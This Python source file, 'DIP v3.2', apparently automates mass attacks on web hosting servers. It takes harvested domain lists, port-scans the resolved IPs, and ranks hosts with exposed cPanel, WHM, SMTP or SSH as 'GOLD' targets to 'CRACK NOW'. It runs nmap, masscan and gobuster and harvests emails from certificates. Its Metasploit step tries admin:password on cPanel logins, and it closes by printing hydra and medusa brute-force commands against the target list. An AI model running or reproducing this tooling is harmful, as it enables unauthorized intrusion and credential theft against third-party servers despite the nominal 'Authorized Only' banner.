#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DIP v3.2 - Domain IP Pentester + Real-time Nmap (Organized Output + Enhanced Features)
# Author: github.com/officialmonsterz
# Purpose: DRAKGRAB → Domain → IP → cPanel/SMTP → INSTANT Nmap Analysis
# Integrations: SSL Harvest, Banner Grab, VHost Enum, Auto-Exploit, Cloud Detect, Masscan, Excel Export

import sys
import socket
import os
import threading
import re
import subprocess
import json
import glob
import time
from queue import Queue
from urllib.parse import urlparse
from colorama import init, Fore
from pyfiglet import Figlet
import dns.resolver

# Initialize colorama
init(autoreset=True)
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE
BLUE = Fore.BLUE
RESET = Fore.RESET

# Fancy DIP Banner
BANNER = Figlet(font='slant')
SUB_BANNER = Figlet(font='small')

# Globals
DOMAIN_QUEUE = Queue()
UNIQUE_IPS = set()
UNIQUE_DOMAINS = set()
ALL_IPS = {}
GOLD_IPS = set()
LOCK = threading.Lock()
PROCESSED_COUNT = 0

# High-value ports + scores (2026 optimized)
TARGET_PORTS = [21, 22, 25, 53, 80, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 2095, 2096, 3306]
PORT_SCORES = {21: 8, 22: 10, 25: 15, 53: 3, 80: 6, 443: 6, 465: 15, 587: 15, 993: 10, 995: 10, 2082: 25, 2083: 25, 2086: 25, 2087: 25, 2095: 20, 2096: 20, 3306: 15}


def load_shodan_config():
    """Load Shodan API from config.json."""
    try:
        if os.path.exists('config.json'):
            with open('config.json', 'r') as f:
                config = json.load(f)
                return config.get('shodan_api', '')
        return ''
    except Exception:
        return ''


def save_shodan_config(api_key):
    """Save Shodan API to config.json."""
    config = {'shodan_api': api_key}
    with open('config.json', 'w') as f:
        json.dump(config, f, indent=2)
    print(f"{GREEN}✅ Shodan API saved → config.json{RESET}")


def create_nmap_results_folder():
    """Create organized nmap_results folder."""
    nmap_dir = "nmap_results"
    if not os.path.exists(nmap_dir):
        os.makedirs(nmap_dir)
        print(f"{GREEN}✅ Created folder → {nmap_dir}/{RESET}")
    return nmap_dir


def extract_domains(file_path):
    """Extract domains from DRAKGRAB format."""
    domains = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            matches = re.findall(
                r'DOMAIN:\s*([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
                content,
                re.IGNORECASE
            )
            domains.extend(matches)
        print(f"{GREEN}✅ Extracted {len(matches)} domains from DRAKGRAB{RESET}")
    except Exception as e:
        print(f"{RED}❌ Parse error: {e}{RESET}")
    return list(set(domains))


def is_valid_domain(domain):
    """Validate domain format."""
    return bool(re.match(
        r'^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$',
        domain
    ))


def clean_domain(domain):
    """Extract clean domain name."""
    parsed = urlparse(domain if domain.startswith('http') else f'http://{domain}')
    return (parsed.netloc or domain).rstrip('/').lower()


def check_ports(ip):
    """Ultra-fast port scanning with banner grabbing (Modification 3)."""
    open_ports = []
    banners = {}
    for port in TARGET_PORTS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(str(port))
                # Banner grabbing: send newline to trigger response
                try:
                    sock.send(b'\n')
                    time.sleep(0.1)
                    banner_data = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    banners[port] = banner_data[:120] if banner_data else "[no banner]"
                except Exception:
                    banners[port] = "[no banner]"
            sock.close()
        except Exception:
            continue
    score = sum(PORT_SCORES.get(int(p), 0) for p in open_ports)
    ports_str = ', '.join(open_ports) if open_ports else "None"
    return ports_str, score, banners


def parse_nmap_output(nmap_output):
    """Parse Nmap output → Gold analysis."""
    services = {}
    hostname = "Unknown"

    # Extract hostname
    host_match = re.search(r'Nmap scan report for (.*?)\n', nmap_output)
    if host_match:
        hostname = host_match.group(1).strip()

    # Extract services
    port_matches = re.findall(
        r'(\d+)/tcp\s+open\s+([^\s]+)\s+(.*?)(?=\n\d|/tcp|$)',
        nmap_output,
        re.DOTALL
    )

    ftp = False
    smtp = False
    cpanel = False
    whm = False
    webmail = False
    ssh = False
    mysql = False

    for port_str, service, version in port_matches:
        port = int(port_str)
        services[port] = f"{service} {version.strip()}"

        if port in [21]:
            ftp = True
        if port in [25, 465, 587]:
            smtp = True
        if port in [2082, 2083, 2086]:
            cpanel = True
        if port in [2087]:
            whm = True
        if port in [2095, 2096]:
            webmail = True
        if port in [22, 16422]:
            ssh = True
        if port in [3306]:
            mysql = True

    return hostname, services, ftp, smtp, cpanel, whm, webmail, ssh, mysql


def save_gold_summary(nmap_dir, ip, hostname, services):
    """Save clean, organized gold summary to SINGLE file."""
    summary_path = os.path.join(nmap_dir, "gold_summary.txt")

    # Critical services only
    critical_services = {}
    if 2082 in services or 2083 in services or 2086 in services:
        critical_services['CPANEL'] = next(
            (s for p, s in services.items() if p in [2082, 2083, 2086]),
            ""
        )
    if 2087 in services:
        critical_services['WHM'] = services[2087]
    if any(p in services for p in [25, 465, 587]):
        smtp_ports = [p for p in [25, 465, 587] if p in services]
        critical_services['SMTP'] = " | ".join([services[p] for p in smtp_ports])
    if 22 in services or 16422 in services:
        critical_services['SSH'] = services.get(22, services.get(16422, ""))
    if 443 in services or 80 in services:
        critical_services['WEB'] = services.get(443, services.get(80, ""))

    # Append to summary file
    with open(summary_path, 'a') as f:
        f.write(f"IP: {ip}\n")
        f.write(f"HOSTNAME: {hostname}\n")
        for service_type, service_info in critical_services.items():
            crack_tag = " (CRACK)" if service_type in ['CPANEL', 'WHM', 'SMTP', 'SSH'] else ""
            f.write(f"{service_type}: {service_info}{crack_tag}\n")
        # Use last service info for exploit suggestion
        last_service = list(critical_services.values())[-1] if critical_services else ""
        if last_service and last_service.split():
            first_word = last_service.split()[0]
            last_word = last_service.split()[-1]
            f.write(f"EXPLOIT: Google '{first_word} {last_word} exploit'\n")
        f.write("---\n")

    print(f"{GREEN}✅ Saved → {summary_path}{RESET}")


def ssl_cert_harvest(gold_ips, nmap_dir):
    """Modification 2: SSL Cert Harvesting - Extract emails/domains from HTTPS certs of GOLD IPs."""
    print(f"\n{MAGENTA}🔐 SSL CERT HARVEST → {len(gold_ips)} GOLD IPs{RESET}")
    ssl_dir = os.path.join(nmap_dir, "ssl_certs")
    if not os.path.exists(ssl_dir):
        os.makedirs(ssl_dir)
        print(f"{GREEN}✅ Created folder → {ssl_dir}/{RESET}")

    all_emails = set()
    all_domains = set()

    for ip in gold_ips:
        cert_file = os.path.join(ssl_dir, f"{ip}.txt")
        try:
            cmd = (
                f"echo | openssl s_client -connect {ip}:443 -servername {ip} 2>/dev/null "
                f"| openssl x509 -noout -text 2>/dev/null"
            )
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            output = result.stdout

            if output:
                with open(cert_file, 'w') as f:
                    f.write(output)
                print(f"{GREEN}  ✅ Cert saved → {cert_file}{RESET}")

                # Extract emails
                email_matches = re.findall(
                    r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                    output
                )
                for email in email_matches:
                    all_emails.add(email.lower())

                # Extract subject/issuer domains
                subject_match = re.search(r'Subject:\s*.+?CN\s*=\s*([^\s,]+)', output)
                issuer_match = re.search(r'Issuer:\s*.+?CN\s*=\s*([^\s,]+)', output)
                for match in [subject_match, issuer_match]:
                    if match:
                        cn = match.group(1).strip()
                        if '.' in cn:
                            all_domains.add(cn.lower())

                # Extract DNS SAN entries
                san_matches = re.findall(r'DNS:([^\s,]+)', output)
                for san in san_matches:
                    all_domains.add(san.lower())
            else:
                print(f"{YELLOW}  ⚠️ No cert data for {ip}{RESET}")
        except subprocess.TimeoutExpired:
            print(f"{YELLOW}  ⚠️ Timeout: {ip}{RESET}")
        except Exception as e:
            print(f"{YELLOW}  ⚠️ Error {ip}: {e}{RESET}")

    # Save collected data
    emails_file = os.path.join(nmap_dir, "ssl_emails.txt")
    domains_file = os.path.join(nmap_dir, "ssl_domains.txt")

    with open(emails_file, 'w') as f:
        for email in sorted(all_emails):
            f.write(email + "\n")
    with open(domains_file, 'w') as f:
        for domain in sorted(all_domains):
            f.write(domain + "\n")

    print(f"{GREEN}  📧 Emails found: {len(all_emails)} → {emails_file}{RESET}")
    print(f"{GREEN}  🌐 Domains found: {len(all_domains)} → {domains_file}{RESET}")
    if all_emails:
        print(f"{CYAN}  Sample emails: {', '.join(list(all_emails)[:5])}{RESET}")


def vhost_enum(ip, nmap_dir):
    """Modification 4: Virtual Host Enumeration using gobuster."""
    vhost_dir = os.path.join(nmap_dir, "vhosts")
    if not os.path.exists(vhost_dir):
        os.makedirs(vhost_dir)

    output_file = os.path.join(vhost_dir, f"{ip}.txt")
    wordlist = "/usr/share/wordlists/dirb/common.txt"

    # Check if wordlist exists, fallback to alternatives
    if not os.path.exists(wordlist):
        alt_wordlists = [
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt"
        ]
        for alt in alt_wordlists:
            if os.path.exists(alt):
                wordlist = alt
                break

    try:
        cmd = f"gobuster vhost -u https://{ip} -w {wordlist} -o {output_file} -t 20 -q 2>/dev/null"
        subprocess.run(cmd, shell=True, timeout=60)
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(f"{GREEN}  🏠 VHosts found for {ip} → {output_file}{RESET}")
        else:
            print(f"{YELLOW}  🏠 No vhosts discovered for {ip}{RESET}")
    except subprocess.TimeoutExpired:
        print(f"{YELLOW}  ⚠️ VHost timeout: {ip}{RESET}")
    except FileNotFoundError:
        print(f"{YELLOW}  ⚠️ gobuster not installed - skipping vhost enum for {ip}{RESET}")
    except Exception as e:
        print(f"{YELLOW}  ⚠️ VHost error {ip}: {e}{RESET}")


def fast_nmap_gold(ip, nmap_dir):
    """Real-time FAST Nmap for GOLD IPs only - Organized output."""
    print(f"\n{BLUE}⚡ FAST NMAP → {ip}{RESET}")

    cmd = f"nmap -p21,22,25,53,80,443,465,587,993,995,2082,2083,2086,2087,2095,2096,3306,8443 -sV --open -T4 {ip}"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout

        hostname, services, ftp, smtp, cpanel, whm, webmail, ssh, mysql = parse_nmap_output(output)

        print(f"{CYAN}📡 HOSTNAME: {hostname}{RESET}")
        print(f"{MAGENTA}🔥 GOLD SERVICES:{RESET}")

        if ftp:
            print(f"  {GREEN}21/ftp     ← File server (CRACK){RESET}")
        if smtp:
            print(f"  {GREEN}25,465,587/smtp ← Email (CRACK){RESET}")
        if 80 in services or 443 in services:
            print(f"  {YELLOW}80,443/http ← Website{RESET}")
        if cpanel:
            print(f"  {GREEN}🎯 2082-2086/cPanel ← ADMIN PANEL (CRACK NOW!){RESET}")
        if whm:
            print(f"  {GREEN}🎯 2087/WHM ← MASTER PANEL (CRACK NOW!){RESET}")
        if webmail:
            print(f"  {GREEN}2095/Roundcube ← Webmail (CRACK NOW!){RESET}")
        if ssh:
            print(f"  {GREEN}22,16422/SSH ← Shell access{RESET}")
        if mysql:
            print(f"  {GREEN}3306/MySQL ← Database{RESET}")

        # Save to organized summary
        save_gold_summary(nmap_dir, ip, hostname, services)

        # Modification 4: VHost Enum for every GOLD IP
        vhost_enum(ip, nmap_dir)

    except Exception as e:
        print(f"{YELLOW}⚠️ Nmap error for {ip}: {e}{RESET}")


def run_nmap(ip_file):
    """Smart Nmap - Gold first, then full - Organized output."""
    print(f"\n{CYAN}🚀 SMART NMAP - GOLD PRIORITY{RESET}")

    # Create organized folder
    nmap_dir = create_nmap_results_folder()

    # Extract GOLD IPs first (100+ pts)
    gold_ips = []
    try:
        with open("dip_targets.txt", 'r') as f:
            for line in f:
                parts = line.strip().split('|')
                if len(parts) >= 4 and int(parts[3]) >= 100:
                    gold_ips.append(parts[1])

        if gold_ips:
            print(f"{GREEN}💎 Found {len(set(gold_ips))} GOLD IPs → Scanning NOW{RESET}")
            with open("gold_ips.txt", 'w') as f:
                for ip in set(gold_ips):
                    f.write(ip + "\n")
                    fast_nmap_gold(ip, nmap_dir)

            # Full Nmap on gold only - organized output
            full_scan_path = os.path.join(nmap_dir, "full_gold_scan.txt")
            subprocess.run(
                f"nmap -iL gold_ips.txt -p- -sV --open -oN '{full_scan_path}'",
                shell=True
            )
            print(f"{GREEN}✅ Full gold scan → {full_scan_path}{RESET}")

            # Modification 2: SSL Cert Harvesting after gold scans
            gold_set = set(gold_ips)
            if gold_set:
                ssl_cert_harvest(gold_set, nmap_dir)
        else:
            print(f"{YELLOW}No 100+pt targets{RESET}")
    except Exception as e:
        print(f"{YELLOW}⚠️ run_nmap error: {e}{RESET}")


def shodan_cli_search(api_key, top_ips):
    """Shodan integration."""
    if not api_key:
        print(f"{YELLOW}⚠️ No Shodan API{RESET}")
        return

    print(f"\n{MAGENTA}🔍 SHODAN REAL-TIME{RESET}")
    try:
        subprocess.run(f"shodan init {api_key}", shell=True, capture_output=True)
        for ip in list(top_ips)[:3]:
            subprocess.run(f"shodan host {ip}", shell=True)
            time.sleep(1)
    except Exception:
        print(f"{YELLOW}⚠️ Shodan CLI → pip install shodan{RESET}")


def resolve_and_scan(domain, total, resolvers=None):
    """Resolve → Scan → Real-time score."""
    global PROCESSED_COUNT
    try:
        domain = clean_domain(domain)
        if not is_valid_domain(domain):
            return False

        # DNS Resolution
        try:
            if resolvers:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = resolvers
                ip = str(resolver.resolve(domain, 'A')[0])
            else:
                ip = socket.gethostbyname(domain)
        except Exception:
            return False

        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return False

        # Port scan with banner grabbing (Modification 3)
        ports, score, banners = check_ports(ip)

        # Modification 6: Cloud Detection - reverse DNS check
        cloud_tag = ""
        try:
            hostname_rdns, _, _ = socket.gethostbyaddr(ip)
            cloud_keywords = ['amazonaws', 'googleusercontent', 'cloudfront', 'azure', 'akamai', 'cloudflare']
            for keyword in cloud_keywords:
                if keyword in hostname_rdns.lower():
                    cloud_tag = "[CLOUD]"
                    score = max(0, score - 50)
                    break
        except Exception:
            pass

        with LOCK:
            ALL_IPS[domain] = ip

            if domain not in UNIQUE_DOMAINS:
                UNIQUE_DOMAINS.add(domain)
                line = f"{domain}|{ip}|{ports}|{score}"

                # All outputs
                with open("dip_targets.txt", 'a', encoding='utf-8') as f:
                    f.write(line + "\n")
                with open("ip_list.txt", 'a') as f:
                    f.write(ip + "\n")

                # GOLD separation
                if score >= 100:
                    GOLD_IPS.add(ip)
                    with open("gold_ips.txt", 'a') as f:
                        f.write(ip + "\n")

                # Live display with cloud tag
                if score >= 100:
                    color = GREEN
                    priority_prefix = f"🔥 GOLD {cloud_tag}"
                elif score >= 70:
                    color = MAGENTA
                    priority_prefix = f"💎 SILVER {cloud_tag}"
                elif score >= 40:
                    color = YELLOW
                    priority_prefix = f"⚡ BRONZE {cloud_tag}"
                else:
                    color = WHITE
                    priority_prefix = f"ℹ️ {cloud_tag}"

                print(f"{color}{priority_prefix} {line}{RESET}")

                # Modification 3: Show banners in live output for Bronze+ targets
                if score >= 40 and banners:
                    banner_str = " | ".join(
                        [f"Port {p}: {b[:60]}" for p, b in banners.items()]
                    )
                    if banner_str:
                        print(f"{CYAN}   📋 Banners: {banner_str}{RESET}")

            if ip not in UNIQUE_IPS:
                UNIQUE_IPS.add(ip)

            PROCESSED_COUNT += 1
            print(f"{CYAN}[{PROCESSED_COUNT}/{total}] → IPs:{len(UNIQUE_IPS)} | GOLD:{len(GOLD_IPS)}{RESET}")

    except Exception:
        with LOCK:
            PROCESSED_COUNT += 1
        return False
    return True


def worker(resolvers=None):
    """Thread worker."""
    while not DOMAIN_QUEUE.empty():
        domain = DOMAIN_QUEUE.get()
        resolve_and_scan(domain, len(domains), resolvers)
        DOMAIN_QUEUE.task_done()


def parse_masscan_results(filepath):
    """Parse masscan -oL output and return dict of {ip: [open_ports]}."""
    ip_ports = {}
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line.startswith('#') or not line:
                    continue
                parts = line.split()
                if len(parts) >= 4 and parts[0] == 'open':
                    port = int(parts[2])
                    ip = parts[3]
                    if ip not in ip_ports:
                        ip_ports[ip] = []
                    if port not in ip_ports[ip]:
                        ip_ports[ip].append(port)
    except Exception as e:
        print(f"{RED}❌ Masscan parse error: {e}{RESET}")
    return ip_ports


def score_from_masscan_ports(open_ports):
    """Score a list of ports using the same PORT_SCORES table."""
    score = 0
    for port in open_ports:
        score += PORT_SCORES.get(port, 0)
    return score


def run_masscan_scan(ip_list_file):
    """Modification 7: Run masscan for ultra-fast initial discovery."""
    print(f"\n{MAGENTA}🚀 MASSCAN HIGH-SPEED DISCOVERY{RESET}")
    masscan_out = "masscan_results.txt"

    if not os.path.exists(ip_list_file) or os.path.getsize(ip_list_file) == 0:
        print(f"{YELLOW}⚠️ No IPs to scan with masscan{RESET}")
        return None

    # Read IPs
    with open(ip_list_file, 'r') as f:
        ips = [line.strip() for line in f if line.strip()]

    if not ips:
        print(f"{YELLOW}⚠️ No IPs found{RESET}")
        return None

    # Write masscan target file
    masscan_targets = "masscan_targets.txt"
    with open(masscan_targets, 'w') as f:
        for ip in ips:
            f.write(ip + "\n")

    # Ports string for masscan
    ports_str = ",".join(str(p) for p in TARGET_PORTS)

    try:
        cmd = f"masscan -p{ports_str} -iL {masscan_targets} --rate=10000 -oL {masscan_out}"
        print(f"{YELLOW}  Running: {cmd}{RESET}")
        subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)

        if os.path.exists(masscan_out):
            ip_ports = parse_masscan_results(masscan_out)
            print(f"{GREEN}✅ Masscan complete: {len(ip_ports)} IPs with open ports{RESET}")
            return ip_ports
        else:
            print(f"{RED}❌ Masscan output not found{RESET}")
            return None
    except FileNotFoundError:
        print(f"{YELLOW}⚠️ masscan not installed - falling back to socket scanning{RESET}")
        return None
    except subprocess.TimeoutExpired:
        print(f"{YELLOW}⚠️ Masscan timed out - falling back{RESET}")
        return None
    except Exception as e:
        print(f"{YELLOW}⚠️ Masscan error: {e}{RESET}")
        return None


def auto_exploit_check(gold_ips):
    """Modification 5: Auto-Exploit Check using Metasploit for cPanel login."""
    if not gold_ips:
        return

    print(f"\n{MAGENTA}💥 AUTO-EXPLOIT CHECK (Metasploit){RESET}")

    # Write gold IPs to file for msf
    gold_file = "gold_ips.txt"
    with open(gold_file, 'w') as f:
        for ip in gold_ips:
            f.write(ip + "\n")

    nmap_dir = "nmap_results"
    if not os.path.exists(nmap_dir):
        os.makedirs(nmap_dir)

    log_file = os.path.join(nmap_dir, "msf_autocrack.log")

    # Metasploit resource script
    msf_resource = os.path.join(nmap_dir, "msf_cpanel.rc")
    with open(msf_resource, 'w') as f:
        f.write("use auxiliary/scanner/http/cpanel_login\n")
        f.write(f"set RHOSTS file:{gold_file}\n")
        f.write("set USERNAME admin\n")
        f.write("set PASSWORD password\n")
        f.write("set THREADS 5\n")
        f.write("run\n")
        f.write("exit\n")

    try:
        cmd = f"msfconsole -q -r {msf_resource}"
        print(f"{YELLOW}  Running Metasploit cPanel scanner...{RESET}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)

        with open(log_file, 'w') as f:
            f.write("=== Metasploit Auto-Exploit Check ===\n")
            f.write(f"Targets: {', '.join(gold_ips)}\n")
            f.write("Module: auxiliary/scanner/http/cpanel_login\n")
            f.write("Username: admin | Password: password\n\n")
            f.write(result.stdout)
            if result.stderr:
                f.write("\n=== STDERR ===\n")
                f.write(result.stderr)

        print(f"{GREEN}✅ Metasploit results → {log_file}{RESET}")

        # Check for successful logins in output
        stdout_lower = result.stdout.lower()
        if "success" in stdout_lower or "login successful" in stdout_lower or "[+]" in result.stdout:
            print(f"{GREEN}  🎯 CREDENTIALS FOUND! Check {log_file}{RESET}")
        else:
            print(f"{YELLOW}  No successful logins found (admin:password){RESET}")

    except FileNotFoundError:
        print(f"{YELLOW}  ⚠️ msfconsole not found - skipping auto-exploit{RESET}")
    except subprocess.TimeoutExpired:
        print(f"{YELLOW}  ⚠️ Metasploit timed out (60s) - partial results in {log_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}  ⚠️ Metasploit error: {e}{RESET}")


def export_to_excel():
    """Modification 8: Export results to CSV and Excel."""
    print(f"\n{MAGENTA}📊 EXPORTING RESULTS{RESET}")

    try:
        import pandas as pd

        if not os.path.exists("dip_targets.txt") or os.path.getsize("dip_targets.txt") == 0:
            print(f"{YELLOW}  ⚠️ No data in dip_targets.txt to export{RESET}")
            return

        # Read full results
        df = pd.read_csv(
            "dip_targets.txt",
            sep='|',
            header=None,
            names=['domain', 'ip', 'ports', 'score']
        )

        # Export to CSV
        csv_path = "DIP_Results.csv"
        df.to_csv(csv_path, index=False)
        print(f"{GREEN}  ✅ CSV exported → {csv_path} ({len(df)} rows){RESET}")

        # Export Top 100 Gold to Excel
        gold_df = df[df.score >= 100]
        if gold_df.shape[0] > 0:
            gold_df = gold_df.sort_values('score', ascending=False).head(100)
            xlsx_path = "GOLD_TARGETS.xlsx"
            gold_df.to_excel(xlsx_path, index=False, sheet_name='GOLD_Targets')
            print(f"{GREEN}  ✅ Excel exported → {xlsx_path} ({len(gold_df)} gold targets){RESET}")
        else:
            print(f"{YELLOW}  No gold targets (100+ pts) to export to Excel{RESET}")

    except ImportError:
        print(f"{YELLOW}  [!] pandas not installed - skipping Excel export{RESET}")
        print(f"{YELLOW}     Install with: pip install pandas openpyxl{RESET}")
    except Exception as e:
        print(f"{YELLOW}  ⚠️ Export error: {e}{RESET}")


def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"{MAGENTA}{BANNER.renderText('DIP')}{RESET}")
    print(f"{CYAN}{SUB_BANNER.renderText('v3.2 Enhanced')}{RESET}")
    print(f"{GREEN}2026 Production Pentest | cPanel/SMTP/Real-time Nmap{RESET}")
    print(f"{WHITE}Author: willsmith32701@gmail.com | Authorized Only{RESET}\n")

    # Auto-find input
    domain_file = None
    patterns = ['HIGH_VALUE_TARGETS*.txt', 'domains.txt', 'zoneh_domains.txt']
    for pattern in patterns:
        matches = glob.glob(pattern)
        if matches:
            domain_file = matches[0]
            print(f"{GREEN}✅ Auto-found: {domain_file}{RESET}")
            break

    if not domain_file:
        domain_file = input("[>] DRAKGRAB file: ").strip()

    if not os.path.exists(domain_file):
        print(f"{RED}❌ File not found{RESET}")
        return

    # Load domains
    global domains
    domains = extract_domains(domain_file)
    if not domains:
        print(f"{RED}❌ No domains{RESET}")
        return

    print(f"\n{GREEN}🎯 {len(domains)} domains loaded{RESET}")

    # Config
    resolver_file = input("[>] resolvers.txt: ").strip()
    resolvers = []
    if resolver_file and os.path.exists(resolver_file):
        with open(resolver_file, 'r') as f:
            resolvers = [line.strip() for line in f if line.strip()]
        print(f"{GREEN}✅ {len(resolvers)} DNS resolvers{RESET}")

    threads = int(input("[>] Threads (5-30) [12]: ") or 12)
    threads = max(5, min(30, threads))

    auto_nmap = input("[>] Real-time Nmap? (y/n) [y]: ").lower().startswith('y')
    shodan_api = input("[>] Shodan API: ").strip()
    if shodan_api:
        save_shodan_config(shodan_api)

    # Modification 7: Masscan option
    use_masscan = input("[>] Use masscan for initial discovery? (y/n) [n]: ").lower().startswith('y')

    # Reset output files
    for file in ["dip_targets.txt", "ip_list.txt", "gold_ips.txt"]:
        open(file, 'w').close()

    global PROCESSED_COUNT
    PROCESSED_COUNT = 0
    UNIQUE_IPS.clear()
    UNIQUE_DOMAINS.clear()
    ALL_IPS.clear()
    GOLD_IPS.clear()

    print(f"\n{YELLOW}🚀 LIVE SCAN START → {threads} threads{RESET}\n")

    # Queue + threads
    for domain in domains:
        DOMAIN_QUEUE.put(domain)

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(resolvers,))
        t.daemon = True
        t.start()
        thread_list.append(t)

    DOMAIN_QUEUE.join()

    # Modification 7: If masscan was selected, run it on discovered IPs and cross-reference
    masscan_data = None
    if use_masscan:
        masscan_data = run_masscan_scan("ip_list.txt")
        if masscan_data:
            print(f"\n{MAGENTA}[MASS] Cross-referencing masscan results with socket scan...{RESET}")
            masscan_updated = 0
            lines = []
            if os.path.exists("dip_targets.txt"):
                with open("dip_targets.txt", 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            parts = line.split('|')
                            if len(parts) >= 4:
                                domain_ip = parts[1]
                                if domain_ip in masscan_data:
                                    masscan_ports = masscan_data[domain_ip]
                                    masscan_port_str = ', '.join(str(p) for p in sorted(masscan_ports))
                                    masscan_score = score_from_masscan_ports(masscan_ports)
                                    current_ports = parts[2]
                                    current_port_count = len(current_ports.split(', ')) if current_ports != "None" else 0
                                    if len(masscan_ports) > current_port_count:
                                        parts[2] = masscan_port_str
                                        parts[3] = str(masscan_score)
                                        line = '|'.join(parts)
                                        masscan_updated += 1
                                        if masscan_score >= 100:
                                            GOLD_IPS.add(domain_ip)
                                            with open("gold_ips.txt", 'a') as f_g:
                                                f_g.write(domain_ip + "\n")
                            lines.append(line)

            if masscan_updated > 0:
                with open("dip_targets.txt", 'w') as f:
                    for line in lines:
                        f.write(line + "\n")
                print(f"{GREEN}[MASS] Updated {masscan_updated} entries with masscan data{RESET}")

    # FINAL REPORT
    print(f"\n{GREEN}🎉 COMPLETE!{RESET}")
    print(f"{GREEN}📊 dip_targets.txt: {len(UNIQUE_DOMAINS)} targets{RESET}")
    print(f"{GREEN}🌐 ip_list.txt: {len(UNIQUE_IPS)} IPs{RESET}")
    print(f"{MAGENTA}💎 gold_ips.txt: {len(GOLD_IPS)} GOLD IPs{RESET}")

    # TOP 100 GOLD
    print(f"\n{MAGENTA}🏆 TOP GOLD TARGETS (100+pts):{RESET}")
    gold_lines = []
    try:
        with open("dip_targets.txt", 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            gold_lines = sorted(
                [l for l in lines if int(l.split('|')[3]) >= 100],
                key=lambda x: int(x.split('|')[3]),
                reverse=True
            )

        for i, line in enumerate(gold_lines[:100], 1):
            print(f"  {i:2d}. {GREEN}{line}{RESET}")

        if len(gold_lines) > 100:
            print(f"  ... +{len(gold_lines) - 100} more GOLD")
        elif len(gold_lines) == 0:
            print(f"  {YELLOW}No 100+pt targets{RESET}")
    except Exception:
        pass

    # Auto tools
    if auto_nmap and GOLD_IPS:
        run_nmap("gold_ips.txt")

    api_key = load_shodan_config()
    if api_key and GOLD_IPS:
        shodan_cli_search(api_key, list(GOLD_IPS))

    # Modification 5: Auto-Exploit Check at the very end
    if GOLD_IPS:
        auto_exploit_check(GOLD_IPS)

    # Modification 8: Export to CSV + Excel
    export_to_excel()

    print(f"\n{GREEN}⚔️ CRACK READY:{RESET}")
    print(f"  {CYAN}hydra -L users.txt -P rockyou.txt gold_ips.txt cpanel -s 2087{RESET}")
    print(f"  {CYAN}hydra -L users.txt -P rockyou.txt gold_ips.txt smtp -s 25{RESET}")
    print(f"  {CYAN}medusa -h gold_ips.txt -u admin -P rockyou.txt -M http{RESET}")


if __name__ == "__main__":
    socket.setdefaulttimeout(2.0)
    main()
